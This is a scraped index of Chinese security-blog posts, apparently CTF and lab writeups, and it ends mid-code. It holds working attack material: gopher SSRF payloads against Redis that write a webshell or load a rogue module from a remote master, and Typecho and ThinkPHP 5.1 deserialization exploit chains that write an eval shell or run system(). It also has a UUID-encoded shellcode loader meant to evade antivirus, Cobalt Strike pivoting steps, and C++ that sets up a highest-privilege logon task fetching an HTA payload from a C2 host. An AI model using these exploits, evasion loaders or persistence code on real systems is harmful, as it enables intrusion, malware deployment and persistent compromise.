redis_arr: cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;) cmd+=CRLF return cmdif __name__==&quot;__main__&quot;: for x in cmd: payload += urllib.quote(redis_format(x)) print payload 利用gopher协议，生成payload 把生成的payload进行url编码 1http://cb0f5ef6-1668-4620-a764-3af2cac0b19b.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%38%25%30%44%25%30%41%66%6c%75%73%68%61%6c%6c%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%25%30%44%25%30%41%31%25%30%44%25%30%41%25%32%34%33%32%25%30%44%25%30%41%25%30%41%25%30%41%25%33%43%25%33%46%70%68%70%25%32%30%73%79%73%74%65%6d%25%32%38%25%32%32%63%61%74%25%32%30%2f%66%6c%61%67%25%32%32%25%32%39%25%33%42%25%33%46%25%33%45%25%30%41%25%30%41%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%31%33%25%30%44%25%30%41%2f%76%61%72%2f%77%77%77%2f%68%74%6d%6c%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%39%25%30%44%25%30%41%73%68%65%6c%6c%2e%70%68%70%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%73%61%76%65%25%30%44%25%30%41 写入成功，得到flag 主从复制rce在docker环境下，一个单一的容器中不会有除redis以外的任何服务存在，如ssh和crontab，再加上权限的严格控制，只靠写文件就很难再getshell了，在这种情况下可以利用主从复制执行命令。 主从复制概念 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。建立主从关系只需要在从节点操作就行了，主节点不用任何操作。 主从复制作用 Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。 利用还是以[网鼎杯 2020 玄武组]SSRFMe为例 需要先下载两个工具 https://github.com/xmsec/redis-ssrf https://github.com/n0b0dyCN/redis-rogue-server 实际用到的只有第一个链接中的rogue-server.py和ssrf-redis.py，还有第二个链接中的exp.so，把这三个文件放到一个文件夹里即可 修改ssrf-redis.py中的一些参数 lhost改为vps地址，6666端口为rogue-server.py的运行端口，command为要执行的命令 ip改为符合要求的0.0.0.0 密码改为root 生成payload 运行rogue-server.py，建立从节点 将生成的payload进行url编码后访问，得到flag 1http://44677c4e-0255-433c-aa69-f1ebedb79c08.node3.buuoj.cn/?url=gopher://0.0.0.0:6379/_%25%32%41%32%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%41%55%54%48%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%72%6f%6f%74%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%37%25%30%44%25%30%41%53%4c%41%56%45%4f%46%25%30%44%25%30%41%25%32%34%31%35%25%30%44%25%30%41%31%31%38%2e%31%39%35%2e%31%36%36%2e%31%33%38%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%36%36%36%36%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%43%4f%4e%46%49%47%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%53%45%54%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%64%69%72%25%30%44%25%30%41%25%32%34%35%25%30%44%25%30%41%2f%74%6d%70%2f%25%30%44%25%30%41%25%32%41%34%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%63%6f%6e%66%69%67%25%30%44%25%30%41%25%32%34%33%25%30%44%25%30%41%73%65%74%25%30%44%25%30%41%25%32%34%31%30%25%30%44%25%30%41%64%62%66%69%6c%65%6e%61%6d%65%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%33%25%30%44%25%30%41%25%32%34%36%25%30%44%25%30%41%4d%4f%44%55%4c%45%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%4c%4f%41%44%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%2f%74%6d%70%2f%65%78%70%2e%73%6f%25%30%44%25%30%41%25%32%41%32%25%30%44%25%30%41%25%32%34%31%31%25%30%44%25%30%41%73%79%73%74%65%6d%2e%65%78%65%63%25%30%44%25%30%41%25%32%34%31%34%25%30%44%25%30%41%63%61%74%25%32%34%25%37%42%49%46%53%25%37%44%2f%66%6c%61%67%25%30%44%25%30%41%25%32%41%31%25%30%44%25%30%41%25%32%34%34%25%30%44%25%30%41%71%75%69%74%25%30%44%25%30%41","link":"/2021/04/26/ssrf%E4%B8%ADgopher-redis%E7%9A%84%E5%88%A9%E7%94%A8%E6%80%BB%E7%BB%93/"},{"title":"typecho反序列化分析","text":"分析1.install.php install.php中存在unserialize函数，__typecho_config可控。值被作为参数传入类Typecho_Db 2./var/Typecho/Cookie.php Typecho_Cookie::get方法从Cookie或者是POST数组中获取数据 3./var/Typecho/Db.php 跟进类Typecho_Db,传入的参数被作为字符串拼接，触发__toString()，全局搜索toString 4./var/Typecho/Feed.php中存在可利用toString方法 满足条件self::RSS2 == $this-&gt;_type执行下面的语句，如果$item[‘author’]是一个类，就会触发__get()方法，开始全局搜索get方法 1$content .= '&lt;dc:creator&gt;' . htmlspecialchars($item['author']-&gt;screenName) . '&lt;/dc:creator&gt;' . self::EOL; 5./var/Typecho/request.php request.php中Typecho_Request类存在__get()方法，__get()含有一个参数，即要获取的成员属性的名称，$key=’screenName’ 6.跟进get方法 6.跟进_applyFilter方法，发现call_user_func函数，到达终点。filter属性为要执行的函数，$value来源为传入参数，在get函数中被$value = $this-&gt;_params[$key]赋值，来源于属性_params。$this-&gt;_params[$key]等于$this-&gt;_params['screenName'] 构造利用链令Typecho_Db类中的$adapterName=$config[‘adapter’]等于Feed.php中的Typecho_Feed类，创建一个数组$a=array(‘adapter’ =&gt;new Typecho_Feed(),’prefix’ =&gt; ‘typecho_’) 令Typecho_Feed类中的$item[‘author’]等于Typecho_Request类 令Typecho_Request类中的属性_params=array('screenName'=&gt;'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)') 令Typecho_Request类中的属性_filter=array(‘assert’) 12345678910111213141516171819202122232425262728293031&lt;?phpclass Typecho_Request{ private $_filter = array(); private $_params = array(); public function __construct(){ $this-&gt;_filter[0] = 'assert'; $this-&gt;_params['screenName'] = 'file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php @eval(\\$_POST[\\'a\\']); ?&gt;&quot;)'; }}class Typecho_Feed{ const RSS2 = 'RSS 2.0'; private $_type; private $_items = array(); public function __construct() { $this-&gt;_type=self::RSS2; $this-&gt;_items[0]=array('author'=&gt;new Typecho_Request()); }}$a=array('adapter' =&gt;new Typecho_Feed(),'prefix' =&gt; 'typecho_');echo urlencode(base64_encode(serialize($a))); 利用条件install.php中要求触发反序列化需要满足两个条件 必须有GET参数finish Refer必须为本站链接，如http://127.0.0.1/typecho 利用结果 写入成功","link":"/2021/03/03/typecho%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90/"},{"title":"thinkphp 5.1.x 反序列化漏洞分析.md","text":"利用链11/thinkphp/library/think/process/pipes/Windows.php 存在__destruct()方法 跟进removeFiles()，file_exists在处理filename时会当成字符串处理，只要让构造$this-&gt;files为包含类的数组就可以调用__toString() 1/thinkphp/library/think/model/concern/Conversion.php 存在_toString() toJson() 调用toArray() toArray() 需要让$this-&gt;visible为空，$this-&gt;hidden为空，调用getAttr()。$data由$this-&gt;data和$this-&gt;merge合并而成。 getAttr()满足条件isset($this-&gt;withAttr[$fieldName])即可命令执行，参数可控 12$closure = $this-&gt;withAttr[$fieldName];$value = $closure($value, $this-&gt;data); getData()，需要满足第二个条件$this-&gt;data数组中存在$name键，即可返回$this-&gt;data[$name] 1/thinkphp/library/think/Loader.php Loader::parseName parseName会把大写字母转为小写并在前面加上_，如A变成_a，不影响payload的构造 函数名为$closure = $this-&gt;withAttr[$fieldName];，$fieldName来源于经过Loader::parseName函数处理的getAttr()函数参数$name，而getAttr()函数参数等于$data的键名$key，$data由$this-&gt;data和$this-&gt;merge合并而成。最终等于$this-&gt;withAttr[$key]。让数组$this-&gt;withAttr与$this-&gt;data有相同的键名即可 执行命令：$value=$this-&gt;getData($name),$name为getAttr()参数，在getData()函数中只要满足array_key_exists($name, $this-&gt;data)就会返回$this-&gt;data[$name]，$name为传入参数等于键值$key，最终等于$this-&gt;data[$key]。 利用构造exp 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?phpnamespace think{ abstract class Model{ private $withAttr = []; private $data = []; public function __construct() { $this-&gt;withAttr=['a'=&gt;'system']; $this-&gt;data=['a'=&gt;'whoami']; } }}namespace think\\model{ use think\\Model; class Pivot extends Model{ }}namespace think\\process\\pipes { use \\think\\Model\\Pivot; use think\\Process; abstract class Pipes { } class Windows extends Pipes { private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; } } echo urlencode(serialize(new Windows()));}?&gt; 利用链2前面的触发点都一样，区别在toArray()这里 toArray() 调用_call()方法，首先遍历数组$this-&gt;append，当键值$name为数组时满足is_array($name)。让$relation等于类名即可触发_call() 在这之前按需要满足3个条件 123451.$this-&gt;append不为空2.is_array($name)让$this-&gt;append等于二维数组，$this-&gt;append=[$key-&gt;数组]3.!$relation构造$this-&gt;append['aaa']和 $this-&gt;relation=['mmm'=&gt;''];即可 getRelation() 满足array_key_exists($name, $this-&gt;relation)就会返回$this-&gt;relation[$name]。$name就是$this-&gt;append数组中的键名。需要让$this-&gt;relation[$name]等于空才能满足!$relation执行下面的语句。 getAttr()返回$value，也就是经过getData()处理的参数$key getData()，$name就是$this-&gt;append数组中的键名$key，最终返回$this-&gt;data[$name]，让它等于一个存在__call()方法且不存在visable()方法的类即可调用__call 1thinkphp/library/think/Request.php __call(),由于array_unshift()会修改参数数组，造成执行命令不可控，所以没办法直接利用这个call_user_func_array,只能寻找新的利用点 filterValue()函数中存在call_user_func，但是$value不可控，不能直接利用 input()函数中调用了filterValue()，参数不可控不能直接利用 param()函数调用input()，执行$this-&gt;input($this-&gt;param, $name, $default, $filter);，参数仍不可控。 isAjax()调用param()，参数$this-&gt;config['var_ajax']可控，这样param()函数中的$name参数可控，这样input()函数中的$name可控。param()函数可以接收$_GET数组赋值给$this-&gt;param，这样input()函数的前两个参数$this-&gt;param和$name都可控了 回到input()函数，传入filterValue()函数的第一个参数$data和第三个$filter是执行命令的关键。$data等于$this-&gt;getData($data,$name)，两个函数参数就是input()传入的参数$this-&gt;param和$name。而$filter等于$this-&gt;getFilter($filter, $default); getData(),最终$data = $data[$val] = $data[$name]，也就是$this-&gt;param[$this-&gt;config['var_ajax']] getFilter()，$filter来源于$this-&gt;filter 利用构造exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778&lt;?phpnamespace think{ class Request{ protected $hook = []; protected $config = [ // 表单请求类型伪装变量 'var_method' =&gt; '_method', // 表单ajax伪装变量 'var_ajax' =&gt; '_ajax', // 表单pjax伪装变量 'var_pjax' =&gt; '_pjax', // PATHINFO变量名 用于兼容模式 'var_pathinfo' =&gt; 's', // 兼容PATH_INFO获取 'pathinfo_fetch' =&gt; ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'], // 默认全局过滤方法 用逗号分隔多个 'default_filter' =&gt; '', // 域名根，如thinkphp.cn 'url_domain_root' =&gt; '', // HTTPS代理标识 'https_agent_name' =&gt; '', // IP代理获取标识 'http_agent_ip' =&gt; 'HTTP_X_REAL_IP', // URL伪静态后缀 'url_html_suffix' =&gt; 'html', ]; protected $param = []; protected $filter; public function __construct() { $this-&gt;hook=['visible'=&gt;[$this,'isAjax']]; $this-&gt;config['var_ajax']='payload'; $this-&gt;param=['payload'=&gt;'whoami']; $this-&gt;filter=['system']; } } abstract class Model{ protected $append = []; private $relation = []; private $data = []; public function __construct() { $this-&gt;append=['mmm'=&gt;[]]; $this-&gt;data=['mmm'=&gt;new Request()];//等于new Request $this-&gt;relation=['mmm'=&gt;'']; } }}namespace think\\model{use think\\Model; class Pivot extends Model{ }}namespace think\\process\\pipes{ use think\\model\\Pivot; //use think\\Process; class Windows { private $files = []; public function __construct() { $this-&gt;files=[new Pivot()]; } } echo urlencode(serialize(new Windows()));}?&gt;","link":"/2021/04/15/thinkphp-5-1-x-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-md/"},{"title":"uuid免杀","text":"原理分析UUID通用唯一标识符（universally unique identifier, UUID）是一个128位的用于在计算机系统中以识别信息的数目。在Windows中也有使用GUID来标识唯一对象 将shellcode转换为uuid用msf生成shellcode 1msfvenom -p windows/x64/exec CMD=&quot;calc.exe&quot; -f c 16个字节转换为一个uuid值，不满时用\\x00填充，\\x00占一个字节 首先用python把shellcode转换为uuid 1uuid.UUID(bytes_le=u) uuid转换为字节 1uuid.UUID('1f748bef-481c-fe01-8b34-ae4801f799ff').bytes_le 将shellcode转换为uuid，不足十六个字节的用\\x00补全 12345678910111213import uuidshellcode=b'\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xc0\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\\x51\\x56\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\\x20\\x48\\x8b\\x72\\x50\\x48\\x0f\\xb7\\x4a\\x4a\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x3c\\x61\\x7c\\x02\\x2c\\x20\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\xe2\\xed\\x52\\x41\\x51\\x48\\x8b\\x52\\x20\\x8b\\x42\\x3c\\x48\\x01\\xd0\\x8b\\x80\\x88\\x00\\x00\\x00\\x48\\x85\\xc0\\x74\\x67\\x48\\x01\\xd0\\x50\\x8b\\x48\\x18\\x44\\x8b\\x40\\x20\\x49\\x01\\xd0\\xe3\\x56\\x48\\xff\\xc9\\x41\\x8b\\x34\\x88\\x48\\x01\\xd6\\x4d\\x31\\xc9\\x48\\x31\\xc0\\xac\\x41\\xc1\\xc9\\x0d\\x41\\x01\\xc1\\x38\\xe0\\x75\\xf1\\x4c\\x03\\x4c\\x24\\x08\\x45\\x39\\xd1\\x75\\xd8\\x58\\x44\\x8b\\x40\\x24\\x49\\x01\\xd0\\x66\\x41\\x8b\\x0c\\x48\\x44\\x8b\\x40\\x1c\\x49\\x01\\xd0\\x41\\x8b\\x04\\x88\\x48\\x01\\xd0\\x41\\x58\\x41\\x58\\x5e\\x59\\x5a\\x41\\x58\\x41\\x59\\x41\\x5a\\x48\\x83\\xec\\x20\\x41\\x52\\xff\\xe0\\x58\\x41\\x59\\x5a\\x48\\x8b\\x12\\xe9\\x57\\xff\\xff\\xff\\x5d\\x48\\xba\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x48\\x8d\\x8d\\x01\\x01\\x00\\x00\\x41\\xba\\x31\\x8b\\x6f\\x87\\xff\\xd5\\xbb\\xf0\\xb5\\xa2\\x56\\x41\\xba\\xa6\\x95\\xbd\\x9d\\xff\\xd5\\x48\\x83\\xc4\\x28\\x3c\\x06\\x7c\\x0a\\x80\\xfb\\xe0\\x75\\x05\\xbb\\x47\\x13\\x72\\x6f\\x6a\\x00\\x59\\x41\\x89\\xda\\xff\\xd5\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x00'shellcodelist=[]if(len(shellcode)%16!=0): while len(shellcode)%16!=0: shellcode+=b'\\x00'for i in range(len(shellcode)//16): u=str(uuid.UUID(bytes_le=shellcode[i*16:i*16+16])) shellcodelist.append(u)print(shellcodelist) 加载shellcode 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;Windows.h&gt;#include &lt;Rpc.h&gt;#include &lt;iostream&gt;#pragma comment(lib, &quot;Rpcrt4.lib&quot;)const char* uuids[] ={&quot;e48348fc-e8f0-00c0-0000-415141505251&quot;,&quot;d2314856-4865-528b-6048-8b5218488b52&quot;,&quot;728b4820-4850-b70f-4a4a-4d31c94831c0&quot;,&quot;7c613cac-2c02-4120-c1c9-0d4101c1e2ed&quot;,&quot;48514152-528b-8b20-423c-4801d08b8088&quot;,&quot;48000000-c085-6774-4801-d0508b481844&quot;,&quot;4920408b-d001-56e3-48ff-c9418b348848&quot;,&quot;314dd601-48c9-c031-ac41-c1c90d4101c1&quot;,&quot;f175e038-034c-244c-0845-39d175d85844&quot;,&quot;4924408b-d001-4166-8b0c-48448b401c49&quot;,&quot;8b41d001-8804-0148-d041-5841585e595a&quot;,&quot;59415841-5a41-8348-ec20-4152ffe05841&quot;,&quot;8b485a59-e912-ff57-ffff-5d48ba010000&quot;,&quot;00000000-4800-8d8d-0101-000041ba318b&quot;,&quot;d5ff876f-f0bb-a2b5-5641-baa695bd9dff&quot;,&quot;c48348d5-3c28-7c06-0a80-fbe07505bb47&quot;,&quot;6a6f7213-5900-8941-daff-d563616c632e&quot;,&quot;00657865-0000-0000-0000-000000000000&quot;,};int main(){ HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0); void* ha = HeapAlloc(hc, 0, 0x100000); //ha为指向申请堆的首地址的指针 DWORD_PTR hptr = (DWORD_PTR)ha; //让hptr指向ha int elems = sizeof(uuids) / sizeof(uuids[0]); for (int i = 0; i &lt; elems; i++) { RPC_STATUS status = UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)hptr);//转换后指向uuid地址保存在hptr if (status != RPC_S_OK) { printf(&quot;failed&quot;); CloseHandle(ha); return -1; } hptr += 16; } EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0); //把EnumSystemLocalesA参数中的回调函数设置为指向shellcode地址指针，执行shellcode CloseHandle(ha); return 0;} 执行成功 API函数UuidFromStringA将字符串形式的shellcode转换为UUID，成功返回RPC_S_OK，失败返回RPC_S_INVALID_STRING_UUID 1234RPC_STATUS UuidFromStringA( RPC_CSTR StringUuid, //指向字符串的指针 UUID *Uuid //以二进制形式返回指向UUID的指针。 ); EnumSystemLocalesA功能为枚举操作系统上安装或支持的语言环境，第一个参数为指向应用程序定义的回调函数的指针，将它设置为指向UUID的指针即可执行shellcode 1234BOOL EnumSystemLocalesA( LOCALE_ENUMPROCA lpLocaleEnumProc, ///指向应用程序定义的回调函数的指针 DWORD dwFlags //指定要枚举的语言环境标识符的标志);","link":"/2021/02/27/uuid%E5%85%8D%E6%9D%80/"},{"title":"不出网主机上线方法","text":"测试环境假设192.168.111.0/24为公网ip段，192.168.204.0/24为内网ip段 web服务器 Windows 2008 r2DMZ主机 虚拟机两块网卡一块设置为NAT模式，一块设置为HOSTONLY模式，可通外网 公网ip:192.168.111.132 内网ip:192.168.204.188 内网主机 Windows 2012虚拟机网卡设置HOSTONLY模式，不通外网 内网ip:192.168.204.141 C2： Kali Linux公网ip：192.168.111.129 1.SMB beacon​ SMB Beacon使用命名管道通过父级Beacon进行通讯，当两个Beacons链接后，子Beacon从父Beacon获取到任务并发送。因为链接的Beacons使用Windows命名管道进行通信，此流量封装在SMB协议中，所以SMB beacon相对隐蔽。SMB beacon不能直接生成可用载荷, 只能使用 PsExec 或 Stageless Payload 上线。 ​ 首先得到内网中一台主机的beacon，抓取密码后进行smb喷射，得到另一台开放445端口的机器上的administrator账户密码，在目标机器不出网的情况下，可以使用Smb beacon使目标主机上线 使用条件 1.具有 SMB Beacon 的主机必须接受 445 端口上的连接。 2.只能链接由同一个 Cobalt Strike 实例管理的 Beacon。 3.利用这种beacon横移必须有目标主机的管理员权限或者说是拥有具有管理员权限的凭据。 使用方法web服务器上线cs，run mimikatz抓取密码 建立listener，选择SMB beacon 在cs中使用psexec进行横向移动，选择现有的beacon作为跳板，这里凭据必须是administrator ，即拥有目标主机管理员权限 连接成功，可以看到smb beacon上线的主机右侧有∞∞标识 2.配置listener通过HTTP代理上线使用goproxy搭建代理goproxy 上传proxy.exe到web服务器，在8080端口开启http代理 1shell C:\\proxy.exe http -t tcp -p &quot;0.0.0.0:8080&quot; --daemon 用netsh命令把外网ip的8080端口转发到内网ip的192.168.204.188的822端口(必须为未使用的端口，否则会失败),web服务器的80端口被占用，不能使用 1shell netsh interface portproxy add v4tov4 listenaddress=192.168.204.188 listenport=822 connectaddress=192.168.111.132 connectport=8080 检测端口是否启用 1netstat -ano | findstr :822 创建listener设置如下 生成stageless payload关于stage 和 stageless的区别： 探寻Metasploit Payload模式背后的秘密 stager分阶段，第一阶段申请内存，第二件阶段向C2发起请求并接受shellcode执行 stageless不分阶段，生成时就包含了所有文件，可以避免shellcode传输不畅造成目标无法上线 成功上线 连接过程 192.168.204.141 → 192.168.204.188:822→ 192.168.111.132:8080→ C2 3.使用pystinger搭建socks4代理pystinger 原理来源:红队攻防实践：不出网主机搭建内网隧道新思路 服务端由webshell和stinger_server.exe构成，webshell只负责进行流量转发，大部分建立连接及处理数据的工作由stinger_server.exe实现，本质就是搭建了一个SOCK4代理转发流量 使用方法上传proxy.php到网站目录，正常访问返回UTF-8 上传stinger_server.exe，执行 1start stinger_server.exe 0.0.0.0 Kali上执行 1./stinger_client -w http://192.168.111.132:81/proxy.php -l 127.0.0.1 -p 60000 cs中新建listener，192.168.204.188为web服务器内网ip，60020为转发端口 使用psexec横向移动，选择listener为stinger，成功上线 参考：Cobalt Strike Listener with Proxy 红队攻防实践：不出网主机搭建内网隧道新思路 dns与smb beacon详解与一种内网穿透方法的实践 内网渗透：不出网渗透技巧https://www.freebuf.com/articles/web/247287.html)","link":"/2020/12/15/%E4%B8%8D%E5%87%BA%E7%BD%91%E4%B8%BB%E6%9C%BA%E4%B8%8A%E7%BA%BF%E6%96%B9%E6%B3%95/"},{"title":"使用COM组件创建计划任务","text":"Windows系统可以设置计划任务来指向一些定时任务。本书中计划任务的触发条件是在用户登陆时触发，执行启动指定路径程序的操作 创建计划任务时涉及到COM组件接口的调用，要求管理员权限，程序逻辑概括为三个部分，分别是初始化操作、创建计划任务操作、删除计划任务操作。 1.初始化操作由于使用COM组件，所以必须调用CoInitialize函数来初始化COM接口环境，这样才能使用COM接口函数。同时也要先获取ITaskService对象指针以及ITaskFolder指针，这两个指针对象主要用来进行计划任务的创建操作。 1.CoInitialize初始化COM组件 2.CoCreateInstance创建任务服务对象 3.连接到任务服务 4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务 初始化操作完成后直接操作ITaskService对象以及ITaskFolder对象 2.创建计划任务从ITaskService对象中创建一个任务定义对象ITaskDefinition，它被用于创建任务，然后对任务定义对象ITaskDefinition进行设置 设置注册信息，包括设置作者信息。 设置主体信息，包括登陆类型、运行权限。 设置配置信息，包括使用电池运行时是否停止 设置操作信息，包括要启动的程序，并设置程序路径和参数 设置触发器，在用户登陆时执行计划任务 3.删除计划任务调用DeleteTask接口函数删除指定名称的计划任务 完整代码这里使用mshta上线，无文件上线的方法很多，不局限这一种 将计划任务设置为执行c:\\windows\\system32\\mshta.exe http://192.168.111.129:8080/p7ptgsev.hta 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208#include &lt;atlbase.h&gt;#include &lt;comdef.h&gt;#include &lt;iostream&gt;#include &lt;Windows.h&gt;#include &lt;shlobj_core.h&gt;#include &lt;taskschd.h&gt;#pragma comment(lib, &quot;taskschd.lib&quot;)ITaskService* m_lpITS = NULL;ITaskFolder* m_lpRootFolder = NULL;//初始化COM组件void Init() { //1.CoInitialize初始化COM组件 HRESULT hr = CoInitialize(NULL); if (FAILED(hr)) { MessageBox(NULL, L&quot;初始化COM组件失败&quot;, L&quot;Failed&quot;, MB_OK); } //2.CoCreateInstance创建任务服务对象 hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (LPVOID*)&amp;m_lpITS); if (FAILED(hr)) { MessageBox(NULL, L&quot;创建任务服务失败&quot;, L&quot;Failed&quot;, MB_OK); } //3.连接到任务服务 hr = m_lpITS-&gt;Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t()); if (FAILED(hr)) { MessageBox(NULL, L&quot;连接服务失败&quot;, L&quot;Failed&quot;, MB_OK); } //4.从ITaskService对象中获取根任务Root Task Folder的指针对象ITaskFolder，这个指针指向新注册的任务 hr = m_lpITS-&gt;GetFolder(_bstr_t(&quot;\\\\&quot;), &amp;m_lpRootFolder); if (FAILED(hr)) { MessageBox(NULL, L&quot;获取指针失败&quot;, L&quot;Failed&quot;, MB_OK); }}//卸载COM组件void UnInit() { if (m_lpITS) { m_lpITS-&gt;Release(); } if (m_lpRootFolder) { m_lpRootFolder-&gt;Release(); } ::CoUninitialize();}//创建计划任务BOOL CreateTask(const char* lpszTaskName,const char* lpszProgramPath,const char* lpszParameters,const char* lpszAuthor) { // 创建任务定义对象来创建任务 ITaskDefinition* pTaskDefinition = NULL; HRESULT hr = m_lpITS-&gt;NewTask(0, &amp;pTaskDefinition); if (FAILED(hr)) { return FALSE; } /* 设置注册信息 */ IRegistrationInfo* pRegInfo = NULL; CComVariant variantAuthor(NULL); variantAuthor = lpszAuthor; hr = pTaskDefinition-&gt;get_RegistrationInfo(&amp;pRegInfo); if (FAILED(hr)) { return FALSE; } // 设置作者信息 hr = pRegInfo-&gt;put_Author(variantAuthor.bstrVal); pRegInfo-&gt;Release(); /* 设置登录类型和运行权限 */ IPrincipal* pPrincipal = NULL; hr = pTaskDefinition-&gt;get_Principal(&amp;pPrincipal); if (FAILED(hr)) { return FALSE; } // 设置登录类型 hr = pPrincipal-&gt;put_LogonType(TASK_LOGON_INTERACTIVE_TOKEN); // 设置运行权限 // 最高权限 hr = pPrincipal-&gt;put_RunLevel(TASK_RUNLEVEL_HIGHEST); pPrincipal-&gt;Release(); /* 设置其他信息 */ ITaskSettings* pSettting = NULL; hr = pTaskDefinition-&gt;get_Settings(&amp;pSettting); if (FAILED(hr)) { return FALSE; } // 设置其他信息 hr = pSettting-&gt;put_StopIfGoingOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_DisallowStartIfOnBatteries(VARIANT_FALSE); hr = pSettting-&gt;put_AllowDemandStart(VARIANT_TRUE); hr = pSettting-&gt;put_StartWhenAvailable(VARIANT_FALSE); hr = pSettting-&gt;put_MultipleInstances(TASK_INSTANCES_PARALLEL); pSettting-&gt;Release(); /* 创建执行动作 */ IActionCollection* pActionCollect = NULL; hr = pTaskDefinition-&gt;get_Actions(&amp;pActionCollect); if (FAILED(hr)) { return FALSE; } IAction* pAction = NULL; // 创建执行操作 hr = pActionCollect-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); pActionCollect-&gt;Release(); /* 设置执行程序路径和参数 */ CComVariant variantProgramPath(NULL); CComVariant variantParameters(NULL); IExecAction* pExecAction = NULL; hr = pAction-&gt;QueryInterface(IID_IExecAction, (PVOID*)(&amp;pExecAction)); if (FAILED(hr)) { pAction-&gt;Release(); return FALSE; } pAction-&gt;Release(); // 设置程序路径和参数 variantProgramPath = lpszProgramPath; variantParameters = lpszParameters; pExecAction-&gt;put_Path(variantProgramPath.bstrVal); pExecAction-&gt;put_Arguments(variantParameters.bstrVal); pExecAction-&gt;Release(); /* 创建触发器，实现用户登陆自启动 */ ITriggerCollection* pTriggers = NULL; hr = pTaskDefinition-&gt;get_Triggers(&amp;pTriggers); if (FAILED(hr)) { return FALSE; } // 创建触发器,把触发器设置为 ITrigger* pTrigger = NULL; hr = pTriggers-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger); if (FAILED(hr)) { return FALSE; } /* 注册任务计划 */ IRegisteredTask* pRegisteredTask = NULL; CComVariant variantTaskName(NULL); variantTaskName = lpszTaskName; hr = m_lpRootFolder-&gt;RegisterTaskDefinition(variantTaskName.bstrVal, pTaskDefinition, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(&quot;&quot;), &amp;pRegisteredTask); if (FAILED(hr)) { pTaskDefinition-&gt;Release(); return FALSE; } 